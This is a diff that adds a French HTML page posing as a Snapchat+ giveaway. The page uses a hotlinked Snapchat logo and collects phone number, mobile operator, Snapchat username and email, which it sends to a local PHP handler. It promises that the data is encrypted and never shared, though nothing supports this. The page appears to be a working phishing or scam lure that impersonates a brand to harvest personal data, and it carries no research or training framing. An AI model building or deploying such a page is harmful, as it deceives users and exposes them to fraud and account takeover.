@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Concours Snapchat+</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap');
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+            background: linear-gradient(135deg, #FFFC00, #FF9900);
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        img {
+            max-width: 150px;
+            height: auto;
+            margin-bottom: 20px;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        h1 {
+            color: #FFFC00;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        h1 .highlight {
+            text-shadow: 0 0 10px rgba(255, 245, 0, 0.7);
+        }
+
+        p {
+            margin-bottom: 25px;
+            color: #555;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+            position: relative;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px;
+            box-sizing: border-box;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+
+        /* Animation quand on écrit dans un champ */
+        input:focus, select:focus {
+            border-color: #FFFC00;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(255, 245, 0, 0.3);
+            transform: scale(1.02);
+        }
+
+        /* Animation de la bordure */
+        input::placeholder, select::placeholder {
+            color: #aaa;
+        }
+
+        /* Effet de "vague" sous le champ */
+        input:focus ~ .input-highlight,
+        select:focus ~ .input-highlight {
+            width: 100%;
+            opacity: 1;
+        }
+
+        .input-highlight {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            height: 2px;
+            background: linear-gradient(90deg, #FFFC00, #FF9900);
+            width: 0%;
+            transition: width 0.3s ease, opacity 0.3s ease;
+            opacity: 0;
+        }
+
+        button {
+            background: linear-gradient(45deg, #FFFC00, #FF9900);
+            color: white;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 16px;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
+        }
+
+        footer p {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #777;
+        }
+
+        .info-text {
+            font-size: 12px;
+            color: #999;
+            margin-top: 5px;
+            text-align: left;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://link.snapchat.com/plus/plus.png" alt="Snapchat+">
+        <h1>Gagnez <span class="highlight">1 an de Snapchat+</span> GRATUITEMENT !</h1>
+        <p>Participez dès maintenant ! Vos données sont sécurisées et ne seront utilisées que pour ce concours.</p>
+
+        <form action="/submit-form.php" method="post">
+            <div class="form-group">
+                <label for="phone">Numéro de téléphone :</label>
+                <input type="tel" id="phone" name="phone" required placeholder="Ex: 0612345678">
+                <span class="input-highlight"></span>
+                <p class="info-text">Nous ne partagerons jamais votre numéro.</p>
+            </div>
+
+            <div class="form-group">
+                <label for="operator">Opérateur :</label>
+                <select id="operator" name="operator" required>
+                    <option value="">-- Sélectionnez votre opérateur --</option>
+                    <option value="orange">Orange</option>
+                    <option value="sfr">SFR</option>
+                    <option value="bouygues">Bouygues Telecom</option>
+                    <option value="free">Free Mobile</option>
+                    <option value="other">Autre</option>
+                </select>
+                <span class="input-highlight"></span>
+            </div>
+
+            <div class="form-group">
+                <label for="snap_id">Identifiant Snapchat :</label>
+                <input type="text" id="snap_id" name="snap_id" required placeholder="Ex: monpseudo">
+                <span class="input-highlight"></span>
+            </div>
+
+            <div class="form-group">
+                <label for="email">Adresse e-mail :</label>
+                <input type="email" id="email" name="email" required placeholder="Ex: exemple@domaine.com">
+                <span class="input-highlight"></span>
+                <p class="info-text">Un email de confirmation vous sera envoyé.</p>
+            </div>
+
+            <button type="submit">Participer maintenant !</button>
+        </form>
+
+        <footer>
+            <p>Vous serez recontacté sous 48h. <strong>Vos données sont cryptées et protégées.</strong></p>
+        </footer>
+    </div>
+</body>
+</html>
